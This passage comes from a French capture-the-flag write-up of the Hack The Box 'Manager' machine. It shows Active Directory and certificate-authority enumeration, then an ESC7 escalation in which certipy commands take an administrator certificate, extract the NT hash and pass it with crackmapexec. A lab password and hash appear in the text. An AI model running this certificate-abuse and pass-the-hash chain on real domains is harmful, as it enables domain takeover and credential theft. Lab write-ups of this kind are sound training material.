Template distinguishedname:             CN=Machine,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=manager,DC=htb
Date of Creation:                       07/27/2023 10:31:05
[+] Extended Key Usage:                 Client Authentication, Server Authentication
EnrollmentFlag:                         AUTO_ENROLLMENT
CertificateNameFlag:                    SUBJECT_ALT_REQUIRE_DNS, SUBJECT_REQUIRE_DNS_AS_CN
[+] Enrollment allowed for:             MANAGER\Domain Computers

[?] +++++ Checking Template 'User' +++++
[+] Identity 'MANAGER\Domain Users' has enrollment rights for template 'User'
Template Name:                          User
Template distinguishedname:             CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=manager,DC=htb
Date of Creation:                       07/27/2023 10:31:05
[+] Extended Key Usage:                 Encrypting File System, Secure E-mail, Client Authentication
EnrollmentFlag:                         INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
CertificateNameFlag:                    SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
[+] Enrollment allowed for:             MANAGER\Domain Users

[?] +++++ Checking Template 'Administrator' +++++

[?] +++++ Searching for Credentials Exposure +++++

[?] +++++ Searching for ASREProastable User +++++

[?] +++++ Searching for Kerberoastable User +++++

[?] +++++ Searching for User with 'Linux/Unix Password' attribute +++++

[?] +++++ Searching for Computer with enabled and readable LAPS attribute +++++

[?] +++++ Searching for Group Managed Service Account (gMSA) +++++

[?] +++++ Searching for Credentials in SYSVOL Group Policy Files +++++

[?] +++++ Searching for Sensitive Information in NETLOGON Share +++++

[?] +++++ Searching for Delegation Issues +++++

[?] +++++ Searching for Computer with Unconstrained Delegation Rights +++++

[?] +++++ Searching for Computer with Constrained Delegation Rights +++++

[?] +++++ Searching for Computer with Resource-Based Constrained Delegation Rights +++++

[?] +++++ Searching for User with Constrained Delegation Rights +++++

[?] +++++ Searching for User with Resource-Based Constrained Delegation Rights +++++

[?] +++++ Starting Account Enumeration +++++

[?] +++++ Searching for Azure AD Connect +++++

[?] +++++ Searching for Users in High Privileged Groups +++++
[+] Found members in group 'BUILTIN\Administrators':
GroupName:                              Enterprise Admins
distinguishedName:                      CN=Enterprise Admins,CN=Users,DC=manager,DC=htb
objectSid:                              S-1-5-21-4078382237-1492182817-2568127209-519
[+] description:                        Designated administrators of the enterprise

GroupName:                              Domain Admins
distinguishedName:                      CN=Domain Admins,CN=Users,DC=manager,DC=htb
objectSid:                              S-1-5-21-4078382237-1492182817-2568127209-512
[+] description:                        Designated administrators of the domain

sAMAccountName:                         Administrator
distinguishedName:                      CN=Administrator,CN=Users,DC=manager,DC=htb
objectSid:                              S-1-5-21-4078382237-1492182817-2568127209-500
memberOf:                               CN=Group Policy Creator Owners,CN=Users,DC=manager,DC=htb
                                        CN=Domain Admins,CN=Users,DC=manager,DC=htb
                                        CN=Enterprise Admins,CN=Users,DC=manager,DC=htb
                                        CN=Schema Admins,CN=Users,DC=manager,DC=htb
                                        CN=Administrators,CN=Builtin,DC=manager,DC=htb
[+] description:                        Built-in account for administering the computer/domain
[*] accountexpires:                     This identity has been expired since 12/31/1600 16:00:00
pwdLastSet:                             07/27/2023 08:24:35
lastLogonTimestamp:                     02/20/2024 11:40:08
userAccountControl:                     NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, NOT_DELEGATED
[+] admincount:                         This identity is or was member of a high privileged admin group

[+] Found members in group 'MANAGER\Domain Admins':
sAMAccountName:                         Administrator
distinguishedName:                      CN=Administrator,CN=Users,DC=manager,DC=htb
objectSid:                              S-1-5-21-4078382237-1492182817-2568127209-500
memberOf:                               CN=Group Policy Creator Owners,CN=Users,DC=manager,DC=htb
                                        CN=Domain Admins,CN=Users,DC=manager,DC=htb
                                        CN=Enterprise Admins,CN=Users,DC=manager,DC=htb
                                        CN=Schema Admins,CN=Users,DC=manager,DC=htb
                                        CN=Administrators,CN=Builtin,DC=manager,DC=htb
[+] description:                        Built-in account for administering the computer/domain
[*] accountexpires:                     This identity has been expired since 12/31/1600 16:00:00
pwdLastSet:                             07/27/2023 08:24:35
lastLogonTimestamp:                     02/20/2024 11:40:08
userAccountControl:                     NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, NOT_DELEGATED
[+] admincount:                         This identity is or was member of a high privileged admin group

[+] Found members in group 'MANAGER\Enterprise Admins':
sAMAccountName:                         Administrator
distinguishedName:                      CN=Administrator,CN=Users,DC=manager,DC=htb
objectSid:                              S-1-5-21-4078382237-1492182817-2568127209-500
memberOf:                               CN=Group Policy Creator Owners,CN=Users,DC=manager,DC=htb
                                        CN=Domain Admins,CN=Users,DC=manager,DC=htb
                                        CN=Enterprise Admins,CN=Users,DC=manager,DC=htb
                                        CN=Schema Admins,CN=Users,DC=manager,DC=htb
                                        CN=Administrators,CN=Builtin,DC=manager,DC=htb
[+] description:                        Built-in account for administering the computer/domain
[*] accountexpires:                     This identity has been expired since 12/31/1600 16:00:00
pwdLastSet:                             07/27/2023 08:24:35
lastLogonTimestamp:                     02/20/2024 11:40:08
userAccountControl:                     NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, NOT_DELEGATED
[+] admincount:                         This identity is or was member of a high privileged admin group

[+] Found members in group 'MANAGER\Group Policy Creator Owners':
sAMAccountName:                         Administrator
distinguishedName:                      CN=Administrator,CN=Users,DC=manager,DC=htb
objectSid:                              S-1-5-21-4078382237-1492182817-2568127209-500
memberOf:                               CN=Group Policy Creator Owners,CN=Users,DC=manager,DC=htb
                                        CN=Domain Admins,CN=Users,DC=manager,DC=htb
                                        CN=Enterprise Admins,CN=Users,DC=manager,DC=htb
                                        CN=Schema Admins,CN=Users,DC=manager,DC=htb
                                        CN=Administrators,CN=Builtin,DC=manager,DC=htb
[+] description:                        Built-in account for administering the computer/domain
[*] accountexpires:                     This identity has been expired since 12/31/1600 16:00:00
pwdLastSet:                             07/27/2023 08:24:35
lastLogonTimestamp:                     02/20/2024 11:40:08
userAccountControl:                     NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, NOT_DELEGATED
[+] admincount:                         This identity is or was member of a high privileged admin group

[+] Found members in group 'BUILTIN\Access Control Assistance Operators':
sAMAccountName:                         Raven
distinguishedName:                      CN=Raven,CN=Users,DC=manager,DC=htb
objectSid:                              S-1-5-21-4078382237-1492182817-2568127209-1116
memberOf:                               CN=Remote Management Users,CN=Builtin,DC=manager,DC=htb
pwdLastSet:                             07/27/2023 08:23:10
lastLogonTimestamp:                     02/22/2024 12:13:56
userAccountControl:                     NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD

[+] Found members in group 'MANAGER\Cert Publishers':
sAMAccountName:                         DC01$
distinguishedName:                      CN=DC01,OU=Domain Controllers,DC=manager,DC=htb
objectSid:                              S-1-5-21-4078382237-1492182817-2568127209-1000
operatingsystem:                        Windows Server 2019 Standard
memberOf:                               CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=manager,DC=htb
                                        CN=Cert Publishers,CN=Users,DC=manager,DC=htb
pwdLastSet:                             10/16/2023 14:00:03
lastLogonTimestamp:                     02/20/2024 11:39:17
[+] userAccountControl:                 SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION


[?] +++++ Searching for High Privileged Users with a password older 5 years +++++

[?] +++++ Searching for High Privileged User which may not require a Password +++++

[?] +++++ Starting Computer Enumeration +++++

[?] +++++ Searching for Domain Controllers +++++
[+] Found Domain Controller 'DC01$':
sAMAccountName:                         DC01$
distinguishedName:                      CN=DC01,OU=Domain Controllers,DC=manager,DC=htb
objectSid:                              S-1-5-21-4078382237-1492182817-2568127209-1000
operatingsystem:                        Windows Server 2019 Standard
memberOf:                               CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=manager,DC=htb
                                        CN=Cert Publishers,CN=Users,DC=manager,DC=htb
pwdLastSet:                             10/16/2023 14:00:03
lastLogonTimestamp:                     02/20/2024 11:39:17
[+] userAccountControl:                 SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION


[?] +++++ Searching for Exchange Servers +++++

[?] +++++ Searching for ADCS Servers +++++
[+] Found ADCS Server 'DC01$':
sAMAccountName:                         DC01$
distinguishedName:                      CN=DC01,OU=Domain Controllers,DC=manager,DC=htb
objectSid:                              S-1-5-21-4078382237-1492182817-2568127209-1000
operatingsystem:                        Windows Server 2019 Standard
memberOf:                               CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=manager,DC=htb
                                        CN=Cert Publishers,CN=Users,DC=manager,DC=htb
pwdLastSet:                             10/16/2023 14:00:03
lastLogonTimestamp:                     02/20/2024 11:39:17
[+] userAccountControl:                 SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION


[?] +++++ Searching for Outdated Operating Systems +++++

[?] +++++ Searching for Detailed Active Directory Information with BloodHound +++++
```

Je pense que cela va tourner autour des certificats :)... Uploadons certify.exe, ce sera peut-être utile.

```powershell
*Evil-WinRM* PS C:\Users\Raven\Documents> .\Certify.exe find /vulnerable

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=manager,DC=htb'

[*] Listing info about the Enterprise CA 'manager-DC01-CA'

    Enterprise CA Name            : manager-DC01-CA
    DNS Hostname                  : dc01.manager.htb
    FullName                      : dc01.manager.htb\manager-DC01-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=manager-DC01-CA, DC=manager, DC=htb
    Cert Thumbprint               : ACE850A2892B1614526F7F2151EE76E752415023
    Cert Serial                   : 5150CE6EC048749448C7390A52F264BB
    Cert Start Date               : 7/27/2023 3:21:05 AM
    Cert End Date                 : 7/27/2122 3:31:04 AM
    Cert Chain                    : CN=manager-DC01-CA,DC=manager,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Deny   ManageCA, Read                             MANAGER\Operator              S-1-5-21-4078382237-1492182817-2568127209-1119
      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
      Allow  ManageCA, ManageCertificates               MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
      Allow  ManageCA, Enroll                           MANAGER\Raven                 S-1-5-21-4078382237-1492182817-2568127209-1116
      Allow  Enroll                                     MANAGER\Operator              S-1-5-21-4078382237-1492182817-2568127209-1119
    Enrollment Agent Restrictions : None

[+] No Vulnerable Certificates Templates found!



Certify completed in 00:00:08.0592263
```

---
### Privesc Admin - ESC7

On dirait qu'on a tout ce qu'il faut pour abuser des certificats, let's go !

```bash
pak@DESKTOP-AF1CU53:~/tmp$ certipy ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'

pak@DESKTOP-AF1CU53:~/tmp$ certipy ca -ca 'manager-DC01-CA' -enable-template SubCA -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'

pak@DESKTOP-AF1CU53:~/tmp$ certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target manager.htb -template SubCA -upn administrator@manager.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 13
Would you like to save the private key? (y/N) y
[*] Saved private key to 13.key
[-] Failed to request certificate

pak@DESKTOP-AF1CU53:~/tmp$ certipy ca -ca "manager-DC01-CA" -issue-request 13 -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!
123'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate

pak@DESKTOP-AF1CU53:~/tmp$ certipy req -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!123' -ca "manager-DC01-CA" -target manager.htb -retrieve 13
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 13
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate has no object SID
[*] Loaded private key from '13.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

Puis on récupère le hash de l'administrateur :

```bash
pak@DESKTOP-AF1CU53:~/tmp$ certipy auth -pfx administrator.pfx
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@manager.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```

```bash
pak@DESKTOP-AF1CU53:~/tmp$ crackmapexec smb 10.129.5.92 -u administrator -H 'ae5064c2f62317332c88629e025924ef'
SMB         10.129.5.92     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.5.92     445    DC01             [+] manager.htb\administrator:ae5064c2f62317332c88629e025924ef (Pwn3d!)
```

